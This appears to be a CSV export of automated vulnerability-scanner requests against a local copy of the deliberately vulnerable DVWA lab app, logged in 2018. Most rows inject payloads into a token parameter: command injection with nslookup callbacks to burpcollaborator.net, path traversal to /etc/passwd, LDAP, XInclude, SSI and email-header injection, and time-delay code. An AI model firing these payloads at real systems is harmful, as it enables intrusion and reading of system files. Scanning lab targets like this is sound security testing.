Number,Complete,Tool,Host,Method,Path,Query,Params,Status,ResponseLength,MimeType,UrlExtension,Comment,IsSSL,NewCookies,RequestTime,ResponseTime,ResponseDelay,ListenerInterface,Regex1Req,Regex1Resp,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,51ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,58ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'.sleep(20).',true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,66ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%7b$%7bsleep(20)%7d%7d,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,78ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=qsmjkhblh6cdnepiyyea3m02wt2mqee51xpm.burpcollaborator.net,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,95ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5550,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,104ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=http%3a%2f%2fav93n1e5kqfxqys21ihu663mzd56twhn4fs4.burpcollaborator.net%2f%3f6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,111ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,119ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%7cnslookup%20-q%3dcname%20ujhnbl2p8a3heigmp25euqr6nxtqhm5ds5gu.burpcollaborator.net.%26,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,137ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,149ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%22%600%26nslookup%20-q%3dcname%2099g210s4yptw4x61fhvtk5hldcj572vtil6a.burpcollaborator.net.%26%60',true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,158ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,164ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%26nslookup%20-q%3dcname%20ooghgf7jd48bjclguwa8zkw0srykmfa6xyln.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20ooghgf7jd48bjclguwa8zkw0srykmfa6xyln.burpcollaborator.net.%26%60',true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,177ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,184ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%7cecho%2036gczuqexf%20cypi0r7t47%7c%7ca%20%23'%20%7cecho%2036gczuqexf%20cypi0r7t47%7c%7ca%20%23%7c%22%20%7cecho%2036gczuqexf%20cypi0r7t47%7c%7ca%20%23,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,192ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%26echo%20h5dyvmaq37%20fibqzd8ppi%26,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,202ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%22%7cecho%20thc15f79u9%209ynrcnp3t8%20%7c%7c,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,210ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%7cecho%20aok52irfvb%20u9lphzk5pr%20%23xzwx,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,217ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,226ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%7cping%20-c%2021%20127.0.0.1%7c%7cx,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,233ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%26ping%20-n%2021%20127.0.0.1%26,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,243ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%7cping%20-c%2021%20127.0.0.1%20%23,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,251ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%22%7cping%20-n%2021%20127.0.0.1%20%7c%7c,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,258ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,271ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=c%3a%5cwindows%5cwin.ini,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,281ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,297ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%006b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,308ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,318ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=%2fetc%2fpasswd,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,331ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,342ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%006b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,353ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=...%2f6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,371ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=rt4wp68wh5)(objectClass%3d*,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,382ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=8re2oih86a)(!(objectClass%3d*),true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,391ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=*)(objectClass%3d*,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,398ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=*)(!(objectClass%3d*),true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,409ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=%3crok%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2fdxe6p4g8mth0s1u53ljx895p1g79v9j06suh.burpcollaborator.net%2frok.xsd%22%3erok%3c%2frok%3e,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,419ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,6400,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,431ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=%3caqb%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fdl26d448at50g1i5rl7xw9tppgv9ja71utii.burpcollaborator.net%2ffoo%22%2f%3e%3c%2faqb%3e,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,441ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5300,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,449ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6]]%3e%3e%3c,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,459ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6'%2b(function()%7bif(typeof%20oozfd%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3boozfd%3d1%3b%7d%7d())%2b',true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,469ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22c68%22%20value%3d%22b574x2o6ur%22--%3e%3c!--%23set%20var%3d%22e8a%22%20value%3d%22d796z4q8wt%22--%3e%3c!--%23echo%20var%3d%22c68%22--%3e%3c!--%23echo%20var%3d%22e8a%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20ysurkpbtheclnmpqy6ei3u0aw12uqmoafx7lw.burpcollaborator.net%22%20--%3e,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,479ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/index.php,,false,200,5400,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,492ms,,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%0d%0aBCC%3aomehef5jb46bhcjgsw88xku0qrwkkcd04nwbl@burpcollaborator.net%0d%0asau%3a%20y,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,516ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6%3e%0d%0aBCC%3apyriqghkn5ictdvh4xk99l612s8lwdq1ho9cy@burpcollaborator.net%0d%0avwt%3a%20q,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,545ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,595ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,612ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,634ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:15,2018/05/16 00:28:15,861ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=v6qj758i2s4ig1v6o0bekhu6o7; ,2018/05/16 00:28:15,2018/05/16 00:28:15,894ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,481ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=2bkvk2lqovfev5f2l8uneki4l7; ,2018/05/16 00:28:16,2018/05/16 00:28:16,488ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,497ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=l35thc6uuf0d43unsfnka34902; ,2018/05/16 00:28:16,2018/05/16 00:28:16,523ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,531ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=q81srh96sd9rvbfdf5t2qkium4; ,2018/05/16 00:28:16,2018/05/16 00:28:16,545ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,562ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=m20cm87np4mt4t2ieddblur7b5; ,2018/05/16 00:28:16,2018/05/16 00:28:16,584ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,593ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=g5egaedt2non02bjrmrdf4jqs3; ,2018/05/16 00:28:16,2018/05/16 00:28:16,627ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,636ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=a4rjn8rvsgp5l4t1otfta8g035; ,2018/05/16 00:28:16,2018/05/16 00:28:16,652ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,669ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=vb26kao9le09odqg9kjfp3pvi4; ,2018/05/16 00:28:16,2018/05/16 00:28:16,691ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,698ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=b76ggui1t185umqct3aplp8605; ,2018/05/16 00:28:16,2018/05/16 00:28:16,714ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,726ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=ti3iuavqom4urla203au39h4t1; ,2018/05/16 00:28:16,2018/05/16 00:28:16,742ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=1as7o7vjqmie23882olcsf1fj7; ,2018/05/16 00:28:16,2018/05/16 00:28:16,747ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=kd4cprt3k9t3478ugfhqmpmce4; ,2018/05/16 00:28:16,2018/05/16 00:28:16,762ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,778ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=pcdiep8n1nl1e5lbfls2oq5op5; ,2018/05/16 00:28:16,2018/05/16 00:28:16,794ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=1j0co5iucbmue4jupn83fv1iq5; ,2018/05/16 00:28:16,2018/05/16 00:28:16,823ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=295ug6a8c6r3t57iuiqif5h465; ,2018/05/16 00:28:16,2018/05/16 00:28:16,829ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=10ego7gd5f1rju9inju9sr8cg2; ,2018/05/16 00:28:16,2018/05/16 00:28:16,863ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,873ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=4ils99f2lnv5lrjmunposutl97; ,2018/05/16 00:28:16,2018/05/16 00:28:16,901ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,908ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=47rejs87i6jsihhndbtji4ohq6; ,2018/05/16 00:28:16,2018/05/16 00:28:16,942ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,949ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=f983rql0i2f07681pe84ktc393; ,2018/05/16 00:28:16,2018/05/16 00:28:16,975ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:16,2018/05/16 00:28:16,983ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=02lelsda7gjttnm0c1ldao5vh7; ,2018/05/16 00:28:17,2018/05/16 00:28:17,9ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:17,2018/05/16 00:28:17,19ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=m056egeqa8ib7po91g7in82ds1; ,2018/05/16 00:28:17,2018/05/16 00:28:17,58ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:17,2018/05/16 00:28:17,68ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=qgq2k7ke398jl2gtabt0ip8414; ,2018/05/16 00:28:17,2018/05/16 00:28:17,101ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:17,2018/05/16 00:28:17,107ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/,id=test&Submit=Submit&user_token=6b2cbb17116e9b5a09437842c00311f6,true,302,0,HTML,,,false,PHPSESSID=np6lfj7u8756mu76hop81hvf14; ,2018/05/16 00:28:17,2018/05/16 00:28:17,152ms,,
0,true,Scanner,http://localhost,GET,/vulnerabilities/sqli/../../login.php,,false,200,1567,HTML,php,,false,,2018/05/16 00:28:17,2018/05/16 00:28:17,159ms,,Login :: Damn Vulnerable Web Application (DVWA) v1.9
